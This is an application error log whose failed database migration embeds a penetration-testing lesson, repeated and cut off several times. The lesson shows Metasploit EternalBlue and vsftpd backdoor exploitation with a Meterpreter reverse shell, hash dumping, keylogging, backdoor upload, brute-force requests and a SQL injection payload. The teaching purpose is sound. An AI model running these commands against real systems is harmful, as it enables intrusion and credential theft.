# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 3 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:56:14.055 [vert.x-eventloop-thread-0] ERROR i.v.c.i.l.c.VertxIsolatedDeployer - Failed in deploying verticle
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:247)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 3 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:243)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
